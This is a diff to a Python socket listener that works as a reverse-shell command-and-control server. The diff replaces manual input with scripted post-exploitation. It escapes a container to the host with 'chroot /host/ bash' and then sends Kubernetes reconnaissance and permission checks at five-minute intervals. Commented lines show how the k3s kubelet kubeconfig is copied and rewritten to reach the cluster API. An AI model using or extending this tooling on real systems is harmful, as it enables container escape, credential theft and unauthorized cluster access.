@@ -1,4 +1,24 @@
 import socket, threading, sys
+from time import sleep
+import random
+
+kubeconfig_commands = [
+	b'chroot /host/ bash\n',
+	# b'ls /var/lib/rancher/k3s/agent/\n',
+	# b'replace=$(cat /var/lib/rancher/k3s/agent/etc/k3s-agent-load-balancer.json | grep -o \'"ServerURL": "[^"]*\' | grep -o \'[^"]*$\')\n',
+	# b'cp /var/lib/rancher/k3s/agent/kubelet.kubeconfig /root/kubeconfig\n',
+	# b'sed -i "s/https:\/\/127.0.0.1:6444/${replace//\//\\\\/}/" /root/kubeconfig\n',
+	# b'export KUBECONFIG=/root/kubeconfig\n'
+]
+
+kubectl_commands = [
+	b'kubectl --kubeconfig=/root/kubeconfig cluster-info\n',
+	b'kubectl --kubeconfig=/root/kubeconfig get nodes\n',
+	b'kubectl --kubeconfig=/root/kubeconfig get pods -A\n',
+	b'kubectl --kubeconfig=/root/kubeconfig get svc -A\n',
+	b'kubectl --kubeconfig=/root/kubeconfig auth can-i --list\n',
+	b'kubectl --kubeconfig=/root/kubeconfig auth can-i delete pod --namespace default\n'
+]
 
 def wait_resp(conn):
 	while True:
@@ -9,9 +29,16 @@ def wait_resp(conn):
 		sys.stdout.flush()
 
 def send_cmds(conn):
-	while True:
-		cmd = sys.stdin.readline()
-		conn.send('{}'.format(cmd).encode())
+	for cmd in kubeconfig_commands:
+		conn.send(cmd)
+
+	for i in range(20):
+		conn.send(random.choice(kubectl_commands))
+		sleep(300) # 1 command every 5 minutes
+
+	conn.send(b'exit\n')
+	conn.send(b'exit\n')
+	exit()
 
 host, port = ('', 8888)
 with socket.socket() as sock:
